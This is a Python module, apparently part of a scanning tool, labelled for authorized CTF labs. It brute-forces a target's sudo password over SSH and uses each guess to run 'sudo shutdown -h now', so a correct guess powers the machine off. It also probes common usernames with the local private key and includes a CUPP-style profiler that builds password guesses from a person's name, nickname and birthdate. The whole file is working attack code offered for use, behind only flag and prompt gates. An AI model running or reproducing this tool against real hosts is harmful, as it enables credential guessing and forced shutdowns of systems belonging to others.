"""SSH Brute Force & Shutdown Module — authorized CTF labs only.

High-speed persistent multi-command channel SSH brute force with built-in
CUPP profiler. Supports sudo shutdown execution via persistent SSH session.

Usage gated behind --no-safe. Requires valid SSH private key in ~/.ssh/id_rsa
and sudo access on target.
"""

from __future__ import annotations

import os
import time
from typing import List, Optional
from urllib.parse import urlparse

from .base import BaseModule

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False


class SSHBruteForceModule(BaseModule):
    name = "SSH Brute Force & Shutdown"

    def run(self) -> None:
        if self.config.safe_mode and not getattr(self.config, "_exploit_allowed", False):
            self.log("Skipped: SSH brute force requires --no-safe")
            return

        if not HAS_PARAMIKO:
            self.log("paramiko not installed. Run: pip install paramiko")
            return

        if not self.config.can_request():
            return

        self.log("Starting SSH brute force & shutdown module...")

        # Target resolution
        host = urlparse(self.config.base_url).hostname or ""
        if not host:
            self.log("Cannot determine host from base URL", style="yellow")
            return

        port = self.config.ssh_port or 22
        private_key_path = os.path.expanduser(self.config.ssh_private_key or "~/.ssh/id_rsa")

        # Try to find SSH port from previous scans
        port = self._find_ssh_port(port)

        # Validate private key
        if not os.path.exists(os.path.expanduser(private_key_path)):
            self.log(f"Private key not found: {private_key_path}", style="red")
            self.log("Use --ssh-key to specify path or place key at ~/.ssh/id_rsa")
            return

        # Get wordlist
        if self.config.ssh_cupp:
            passwords = self._generate_cupp_wordlist()
        else:
            passwords = self._load_wordlist()

        if not passwords:
            self.log("Empty wordlist", style="red")
            return

        # Find valid username
        username = self._find_username(host, port, private_key_path)
        if not username:
            self.log("No valid username found", style="red")
            return

        # Confirm before attack
        if not self.config.ssh_confirm:
            self.log("Use --ssh-confirm to authorize shutdown", style="yellow")
            return

        # Execute brute force shutdown
        self._execute_ssh_shutdown(host, port, private_key_path, username, passwords)

    def _find_ssh_port(self, default: int) -> int:
        """Try to find SSH port from previous scan results."""
        if hasattr(self.reporter, 'endpoints'):
            for ep in self.reporter.endpoints:
                if "ssh" in ep.lower() or ":22" in ep:
                    return 22
        return default

    def _load_wordlist(self) -> List[str]:
        """Load passwords from file."""
        wordlist_path = os.path.join(os.path.dirname(__file__), "..", "..", "passwords.txt")
        if not os.path.exists(wordlist_path):
            self.log(f"Wordlist not found: {wordlist_path}", style="red")
            return []
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]

    def _generate_cupp_wordlist(self) -> List[str]:
        """Interactive CUPP profiler (simplified)."""
        from rich.prompt import Prompt, Confirm
        from rich.console import Console
        console = Console()

        console.print("\n[bold yellow][*] CUPP PROFILER ENGINE[/bold yellow]")
        
        first_name = Prompt.ask("[cyan][?][/cyan] First Name target").strip().lower()
        surname = Prompt.ask("[cyan][?][/cyan] Surname target").strip().lower()
        nickname = Prompt.ask("[cyan][?][/cyan] Nickname target").strip().lower()
        birthdate = Prompt.ask("[cyan][?][/cyan] Birthdate (e.g. 17081945 or empty)").strip()
        keywords_raw = Prompt.ask("[cyan][?][/cyan] Custom keywords (comma separated)")
        keywords = [k.strip().lower() for m in keywords_raw.split(",") for k in m.split() if k.strip()]
        
        if not first_name and not keywords:
            first_name = "target"

        do_leet = Confirm.ask("[cyan][?][/cyan] Leet-Speak mutations?", default=True)
        do_suffix = Confirm.ask("[cyan][?][/cyan] Special suffixes?", default=True)

        base_words = set(filter(None, [first_name, surname, nickname] + keywords))
        generated = set()
        
        leet_table = str.maketrans({'a': '@', 'e': '3', 'i': '1', 'l': '1', 'o': '0', 's': '5', 't': '7', 'b': '8'})
        suffixes = ["", "!", "@", "#", "123", "2024", "18", "19", "8"]
        prefixes = ["", "@", "!", "_"]
        
        for word in base_words:
            if len(word) < 2:
                continue
            variations = [word, word.capitalize(), word.upper()]
            if do_leet:
                leet = word.translate(str.maketrans({'a': '@', 'e': '3', 'i': '1', 'l': '1', 'o': '0', 's': '5', 't': '7', 'b': '8'}))
                variations.extend([leet, leet.capitalize()])
            for var in variations:
                for prefix in prefixes:
                    generated.add(f"{prefix}{var}")
                    for suffix in suffixes:
                        generated.add(f"{prefix}{var}{suffix}")
            if birthdate:
                for var in variations:
                    generated.add(f"{var}{birthdate[-2:]}")
                    generated.add(f"{var}{birthdate[-4:]}")

        return list(filter(None, generated))

    def _find_username(self, host: str, port: int, key_path: str) -> Optional[str]:
        """Auto-detect valid username via SSH key."""
        import paramiko
        
        common_users = ["root", "ubuntu", "blue_crew61", "admin", "user", "kali", "debian"]
        
        try:
            private_key = paramiko.RSAKey.from_private_key_file(os.path.expanduser(key_path))
        except Exception as e:
            self.log(f"Failed to load private key: {e}", style="red")
            return None

        self.log("Auto-detecting valid SSH username...")
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        for username in common_users:
            try:
                ssh.connect(hostname=host, port=port, username=username, pkey=private_key, timeout=3)
                ssh.close()
                self.log(f"Valid username found: {username}", style="green")
                return username
            except paramiko.AuthenticationException:
                continue
            except Exception:
                break
        
        return None

    def _execute_ssh_shutdown(self, host: str, port: int, key_path: str, username: str, passwords: List[str]) -> None:
        """Execute persistent SSH brute force shutdown."""
        import paramiko
        
        PROMPT_TOKEN = "WESCAN_CHALLENGE:"
        private_key = paramiko.RSAKey.from_private_key_file(os.path.expanduser(key_path))
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            self.log(f"Connecting to {host}:{port} as {username}...")
            ssh.connect(hostname=host, port=port, username=username, pkey=private_key, timeout=10)
            
            transport = ssh.get_transport()
            self.log(f"Testing {len(passwords)} passwords via persistent channel...")
            
            for i, password in enumerate(passwords):
                if not self.config.can_request():
                    self.log("Budget exhausted")
                    break
                    
                if not transport or not transport.is_active():
                    self.log("SSH session lost")
                    break
                
                channel = transport.open_session()
                channel.get_pty()
                channel.exec_command(f"sudo -S -p 'WESCAN_CHALLENGE:' shutdown -h now")
                time.sleep(0.12)
                channel.send(password + "\n")
                time.sleep(0.25)
                
                output = ""
                if channel.recv_ready():
                    output = channel.recv(4096).decode(errors="ignore")
                
                channel.close()
                
                if "WESCAN_CHALLENGE:" in output or "sorry" in output.lower() or "incorrect" in output.lower():
                    if i % 50 == 0:
                        self.log(f"[FAIL] <redacted>")
                    continue
                else:
                    self.log(f"[SUCCESS] Password found for {username}@{host}:{port}", style="green")
                    self.log("Shutdown command sent!", style="green")
                    time.sleep(2)
                    self.reporter.add_finding(
                        "SSH Brute Force Success",
                        severity="critical",
                        detail=f"Valid sudo password found for {username}@{host}:{port}",
                        evidence="<redacted>",
                    )
                    return
            
            self.log("Brute force completed - no valid password found", style="red")
            
        except Exception as e:
            if "EOFError" in str(type(e)) or "Socket is closed" in str(e):
                self.log("SSH session closed - target likely powered off", style="green")
            else:
                self.log(f"Error: {e}", style="red")
        finally:
            try:
                ssh.close()
            except Exception:
                pass


# Standalone helper for direct CLI usage
def _generate_cupp_wordlist_standalone(console) -> List[str]:
    """Interactive CUPP profiler for standalone use."""
    from rich.prompt import Prompt, Confirm

    console.print("\n[bold yellow][*] CUPP PROFILER ENGINE[/bold yellow]")
    
    first_name = Prompt.ask("[cyan][?][/cyan] First Name target").strip().lower()
    surname = Prompt.ask("[cyan][?][/cyan] Surname target").strip().lower()
    nickname = Prompt.ask("[cyan][?][/cyan] Nickname target").strip().lower()
    birthdate = Prompt.ask("[cyan][?][/cyan] Birthdate (e.g. 17081945 or empty)").strip()
    keywords_raw = Prompt.ask("[cyan][?][/cyan] Custom keywords (comma separated)")
    keywords = [k.strip().lower() for m in keywords_raw.split(",") for k in m.split() if k.strip()]
    
    if not first_name and not keywords:
        first_name = "target"

    do_leet = Confirm.ask("[cyan][?][/cyan] Leet-Speak mutations?", default=True)
    do_suffix = Confirm.ask("[cyan][?][/cyan] Special suffixes?", default=True)

    base_words = set(filter(None, [first_name, surname, nickname] + keywords))
    generated = set()
    
    leet_table = str.maketrans({'a': '@', 'e': '3', 'i': '1', 'l': '1', 'o': '0', 's': '5', 't': '7', 'b': '8'})
    suffixes = ["", "!", "@", "#", "123", "2024", "18", "19", "8"]
    prefixes = ["", "@", "!", "_"]
    
    for word in base_words:
        if len(word) < 2:
            continue
        variations = [word, word.capitalize(), word.upper()]
        if do_leet:
            leet = word.translate(str.maketrans({'a': '@', 'e': '3', 'i': '1', 'l': '1', 'o': '0', 's': '5', 't': '7', 'b': '8'}))
            variations.extend([leet, leet.capitalize()])
        for var in variations:
            for prefix in prefixes:
                generated.add(f"{prefix}{var}")
                for suffix in suffixes:
                    generated.add(f"{prefix}{var}{suffix}")
        if birthdate:
            for var in variations:
                generated.add(f"{var}{birthdate[-2:]}")
                generated.add(f"{var}{birthdate[-4:]}")

    return list(filter(None, generated))


def _execute_ssh_shutdown_standalone(host: str, port: int, username: str, passwords: List[str], console) -> int:
    """Execute persistent SSH brute force shutdown (standalone version)."""
    import paramiko
    import time

    PROMPT_TOKEN = "WESCAN_CHALLENGE:"
    private_key = paramiko.RSAKey.from_private_key_file(os.path.expanduser("~/.ssh/id_rsa"))
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        console.print(f"[yellow][*][/yellow] Connecting to {host}:{port} as {username}...")
        ssh.connect(hostname=host, port=port, username=username, pkey=private_key, timeout=10)
        
        transport = ssh.get_transport()
        console.print(f"[yellow][*][/yellow] Testing {len(passwords)} passwords via persistent channel...")
        
        for i, password in enumerate(passwords):
            if not transport or not transport.is_active():
                console.print("[red]SSH session lost[/red]")
                break
            
            channel = transport.open_session()
            channel.get_pty()
            channel.exec_command(f"sudo -S -p 'WESCAN_CHALLENGE:' shutdown -h now")
            time.sleep(0.12)
            channel.send(password + "\n")
            time.sleep(0.25)
            
            output = ""
            if channel.recv_ready():
                output = channel.recv(4096).decode(errors="ignore")
            
            channel.close()
            
            if "WESCAN_CHALLENGE:" in output or "sorry" in output.lower() or "incorrect" in output.lower():
                if i % 50 == 0:
                    console.print(f"[red][FAIL][/red] <redacted>")
                continue
            else:
                console.print(f"[green][SUCCESS][/green] Password found for {username}@{host}:{port}", style="green")
                console.print("[green][+][/green] Shutdown command sent!", style="green")
                time.sleep(2)
                return 0
        
        console.print("[red]Brute force completed - no valid password found[/red]")
        return 1
        
    except Exception as e:
        if "EOFError" in str(type(e)) or "Socket is closed" in str(e):
            console.print("[green]SSH session closed - target likely powered off[/green]")
            return 0
        else:
            console.print(f"[red]Error: {e}[/red]")
            return 1
    finally:
        try:
            ssh.close()
        except Exception:
            pass


def run_ssh_shutdown(
    target: str,
    private_key: str = "~/.ssh/id_rsa",
    port: int = 22,
    use_cupp: bool = False,
    confirm: bool = False,
) -> int:
    """Standalone entry point for SSH shutdown brute force."""
    from rich.console import Console
    from rich.prompt import Confirm, Prompt
    import paramiko

    console = Console()

    if not confirm:
        if not Confirm.ask(f"[red]Authorize SSH shutdown on {target}:{port}?[/red]", default=False):
            return 1

    key_path = os.path.expanduser(private_key)
    if not os.path.exists(key_path):
        console.print(f"[red]Private key not found: {key_path}[/red]")
        return 1

    # Resolve target host
    host = urlparse(target).hostname or target
    if not host:
        console.print(f"[red]Cannot determine host from target: {target}[/red]")
        return 1

    # Load wordlist
    if use_cupp:
        passwords = _generate_cupp_wordlist_standalone(console)
    else:
        wordlist_path = os.path.join(os.path.dirname(__file__), "..", "..", "passwords.txt")
        if not os.path.exists(wordlist_path):
            console.print(f"[red]Wordlist not found: {wordlist_path}[/red]")
            return 1
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]

    if not passwords:
        console.print("[red]Empty wordlist[/red]")
        return 1

    # Find valid username
    console.print(f"[yellow][*][/yellow] Auto-detecting valid SSH username on {host}:{port}...")
    try:
        private_key_obj = paramiko.RSAKey.from_private_key_file(os.path.expanduser("~/.ssh/id_rsa"))
    except Exception as e:
        console.print(f"[red]Failed to load private key: {e}[/red]")
        return 1

    common_users = ["root", "ubuntu", "blue_crew61", "admin", "user", "kali", "debian"]
    username = None
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in common_users:
        try:
            ssh.connect(hostname=host, port=port, username=user, pkey=private_key_obj, timeout=3)
            ssh.close()
            console.print(f"[green][+][/green] Valid username found: {user}")
            username = user
            break
        except paramiko.AuthenticationException:
            continue
        except Exception:
            break

    if not username:
        console.print("[red]No valid username found[/red]")
        return 1

    # Confirm before attack
    from rich.prompt import Confirm as ConfirmPrompt
    if not ConfirmPrompt.ask(f"[red]Authorize SSH shutdown on {host}:{port} as {username}?[/red]", default=False):
        console.print("[yellow]Cancelled[/yellow]")
        return 1

    # Execute brute force shutdown
    return _execute_ssh_shutdown_standalone(host, port, username, passwords, console)